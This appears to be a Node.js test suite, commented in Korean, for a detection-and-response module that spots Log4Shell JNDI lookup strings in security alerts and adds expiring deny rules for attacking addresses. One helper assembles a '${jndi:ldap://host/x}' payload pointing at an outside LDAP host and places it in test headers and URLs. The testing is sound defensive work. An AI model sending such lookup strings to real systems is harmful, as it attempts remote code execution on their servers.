import assert from 'node:assert/strict';
import { mkdtemp, readFile } from 'node:fs/promises';
import { readFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import { decide } from '../xdr/known-cve/decide.mjs';
import { readAlerts } from '../xdr/known-cve/read-alerts.mjs';
import { createDenyList, handleAlert, respond, RULE_ID, withKnownCveDeny } from '../xdr/known-cve/respond.mjs';
import { decide as realDecide } from '../src/decider.mjs';

const fixture = JSON.parse(readFileSync(new URL('../xdr/fixtures/known-cve.json', import.meta.url), 'utf8'));
const ordered = [...fixture.alerts].sort((a, b) => Date.parse(a.timestamp) - Date.parse(b.timestamp));
const patternsFile = readFileSync(new URL('../xdr/known-cve/patterns.json', import.meta.url), 'utf8');
const decideSource = readFileSync(new URL('../xdr/known-cve/decide.mjs', import.meta.url), 'utf8');
// 시험용 조회 구문은 실행할 때 조립합니다.
const lookup = (host = '203.0.113.9') => ['$', '{jndi:ldap://', host, '/x}'].join('');
const logPath = async () => join(await mkdtemp(join(tmpdir(), 'xdr-kc-')), 'alerts.log');
const attackIds = ordered.filter((a) => a.rule.level >= 10).map((a) => a.id);
const normalIds = ordered.filter((a) => a.rule.level <= 3).map((a) => a.id);

async function replay(options = {}) {
  let clock = 0;
  const logFile = options.logFile ?? await logPath();
  const denyList = createDenyList({ now: () => clock, ...options.list });
  const outcomes = new Map();
  for (const alert of ordered) {
    clock = Date.parse(alert.timestamp);
    outcomes.set(alert.id, await handleAlert(alert, { denyList, logFile, now: () => clock }));
  }
  return { denyList, logFile, outcomes, setClock: (ms) => { clock = ms; } };
}

test('read-alerts keeps one line per alert and never prints header or url fields', async () => {
  const { alerts, rows, lines } = await readAlerts();
  assert.equal(alerts, 24);
  assert.equal(rows.length, alerts);
  assert.ok(lines.every((line) => !line.includes('jndi:')));
});

test('patterns: every pattern has a one-line evidence and decide.mjs carries the same list', () => {
  const file = JSON.parse(patternsFile);
  assert.equal(file.patterns.length, 3);
  for (const pattern of file.patterns) {
    assert.ok(pattern.name && pattern.condition && pattern.source);
    assert.ok(typeof pattern.evidence === 'string' && pattern.evidence.length > 0 && !pattern.evidence.includes('\n'));
  }
  const copied = /PATTERNS-BEGIN\n.*? = (\{[\s\S]*\});\n\/\/ PATTERNS-END/u.exec(decideSource);
  assert.deepEqual(JSON.parse(copied[1]), file);
});

test('decide.mjs has no imports, no file or network access, and only decides', () => {
  assert.ok(!/^\s*import\b/mu.test(decideSource));
  assert.ok(!/\bimport\s*\(|\brequire\s*\(|\bfetch\s*\(|readFile|writeFile|appendFile|process\./u.test(decideSource));
});

test('decide splits the fixture into block 8, alert 8, record 8 and does not change the alerts', () => {
  const before = JSON.stringify(fixture);
  const counts = { block: 0, alert: 0, record: 0 };
  for (const alert of fixture.alerts) {
    const result = decide(alert);
    counts[result.action] += 1;
    assert.deepEqual(Object.keys(result).sort(), ['action', 'confidence', 'reason']);
    assert.ok(result.confidence >= 0 && result.confidence <= 1);
    assert.ok(!result.reason.includes('\n') && !result.reason.includes('jndi:'));
    assert.equal(result.action, result.confidence >= 0.85 ? 'block' : result.confidence >= 0.5 ? 'alert' : 'record');
  }
  assert.deepEqual(counts, { block: 8, alert: 8, record: 8 });
  assert.deepEqual(fixture.alerts.filter((a) => decide(a).action === 'block').map((a) => a.id), attackIds);
  assert.equal(JSON.stringify(fixture), before);
});

test('decide: words, fragments and bare braces are not exploit shapes; unreadable alerts are only recorded', () => {
  const low = { level: 2, description: '시험' };
  for (const url of ['/s?q=CVE-2021-44228', '/s?q=jndi', '/s?q=$%7Bjndi', '/s?q=%24%7Bjndi%3Aldap%3A%2F%2F']) {
    assert.equal(decide({ data: { srcip: '203.0.113.10', url }, rule: low }).action, 'record', url);
  }
  assert.equal(decide({ data: { srcip: '203.0.113.10', useragent: lookup() }, rule: low }).action, 'block');
  assert.equal(decide({ data: { srcip: '203.0.113.10', url: `/s?q=${encodeURIComponent(lookup())}` }, rule: low }).action, 'block');
  assert.equal(decide({ data: { srcip: 'x', useragent: lookup() }, rule: low }).action, 'alert');
  for (const bad of [null, undefined, {}, { data: [] }, { data: { url: 'a'.repeat(5000) } }]) assert.equal(decide(bad).action, 'record');
});

test('replaying the fixture blocks only the clear attacks and lets normal requests through', async () => {
  const before = JSON.stringify(fixture);
  const { outcomes, logFile } = await replay();
  // 시계가 마지막 경보 시각에 있어 앞선 규칙은 이미 만료됐으므로, 흘리는 중에 만든 규칙을 결과에서 모읍니다.
  const active = [...outcomes.values()].map((outcome) => outcome.rule).filter(Boolean);
  // kc-02 는 kc-01 과 같은 주소라 규칙이 겹치지 않고 알림으로 남습니다.
  assert.equal(active.length, 7);
  assert.deepEqual(active.map((rule) => rule.alertId).sort(), attackIds.filter((id) => id !== 'kc-02').sort());
  for (const rule of active) {
    assert.equal(rule.type, 'deny');
    assert.match(rule.alertId, /^kc-\d+$/u);
    assert.ok(Date.parse(rule.expiresAt) > Date.parse(rule.createdAt));
  }
  assert.equal(outcomes.get('kc-02').skipped, 'duplicate');
  for (const id of normalIds) assert.equal(outcomes.get(id).outcome, 'recorded');
  const blockedAddresses = new Set(active.map((rule) => rule.address));
  for (const alert of fixture.alerts.filter((a) => normalIds.includes(a.id) || (a.rule.level >= 4 && a.rule.level <= 9))) {
    assert.ok(!blockedAddresses.has(alert.data.srcip), `${alert.id} 의 주소가 막히면 안 됩니다`);
  }
  assert.equal(JSON.stringify(fixture), before);

  const lines = (await readFile(logFile, 'utf8')).trim().split('\n');
  assert.equal(lines.length, 16);
  assert.ok(lines.every((line) => /^\d{4}-\d\d-\d\dT[\d:.]+Z (BLOCK|ALERT) module=known-cve alert=kc-\d+ /u.test(line)));
  assert.ok(lines.every((line) => !line.includes('jndi:') && !line.includes('user0')));
});

test('the connection only adds denials: blocked addresses are denied, everyone else gets the original decision', async () => {
  // 흘리는 동안 만료된 규칙은 목록에서 지워지므로, 새 목록에 첫 공격 경보로 규칙 하나를 넣고 만료 전 시각에서 확인합니다.
  const first = ordered.find((a) => a.id === 'kc-01');
  let clock = Date.parse(first.timestamp);
  const denyList = createDenyList({ now: () => clock });
  assert.ok(denyList.add(first, decide(first)).rule);
  clock += 60_000;
  const baseline = { schema: 'aleph.decision.v1', requestId: 'r-1', service: 'notes', method: 'GET', path: '/notes/demo', route: 'GET /notes/:id', deviceRegistered: true };
  const attacker = '203.0.113.10';
  const normal = '192.0.2.72';
  const addressOf = (request) => request.__address;
  const connected = withKnownCveDeny(realDecide, { denyList, addressOf });
  const denied = await connected({ ...baseline, __address: attacker });
  assert.deepEqual({ decision: denied.decision, ruleIds: denied.ruleIds }, { decision: 'deny', ruleIds: [RULE_ID] });
  assert.equal(denied.requestId, 'r-1');
  assert.deepEqual(await connected({ ...baseline, __address: normal }), await realDecide(baseline));
  // 거부된 요청을 원래 판정기가 거부해도 허용으로 바뀌지 않습니다.
  const unregistered = { ...baseline, deviceRegistered: false, __address: normal };
  assert.equal((await connected(unregistered)).decision, 'deny');
  // 주소를 모르는 기본 연결은 아무것도 막지 않습니다.
  assert.deepEqual(await withKnownCveDeny(realDecide, { denyList })(baseline), await realDecide(baseline));
  assert.throws(() => withKnownCveDeny(null, { denyList }), TypeError);
});

test('denials expire, protected, internal and user-identified addresses are never denied', async () => {
  let clock = Date.parse('2026-09-27T09:00:00+09:00');
  const list = createDenyList({ now: () => clock, ttlMs: 60_000, protectedAddresses: ['203.0.113.50'] });
  const alertWith = (id, srcip, data = {}) => ({ id, rule: { level: 12 }, data: { srcip, useragent: lookup(), ...data } });
  const block = (alert) => ({ action: 'block', confidence: 0.9, reason: 'jndi_lookup_in_header: 시험' });
  assert.ok(list.add(alertWith('t-1', '203.0.113.60'), block()).rule);
  assert.ok(list.match('203.0.113.60'));
  clock += 61_000;
  assert.equal(list.match('203.0.113.60'), null);
  assert.equal(list.add(alertWith('t-2', '203.0.113.50'), block()).skipped, 'protected_address');
  assert.equal(list.add(alertWith('t-3', '10.0.0.5'), block()).skipped, 'internal_address');
  assert.equal(list.add(alertWith('t-4', '203.0.113.61', { srcuser: 'user01' }), block()).skipped, 'known_user');
  assert.equal(list.add(alertWith('t-5', '203.0.113.62'), { action: 'alert', confidence: 0.6, reason: '시험' }).skipped, 'not_block');
  assert.equal(list.add({ rule: { level: 12 }, data: { srcip: '203.0.113.63' } }, block()).skipped, 'no_alert_id');
  assert.equal(list.add(alertWith('t-6', 'not-an-address'), block()).skipped, 'bad_address');
  const logFile = await logPath();
  const result = await respond(alertWith('t-7', '10.0.0.5'), block(), { denyList: list, logFile, now: () => clock });
  assert.equal(result.outcome, 'alerted');
  assert.match(await readFile(logFile, 'utf8'), /ALERT .*block_skipped=internal_address/u);
});
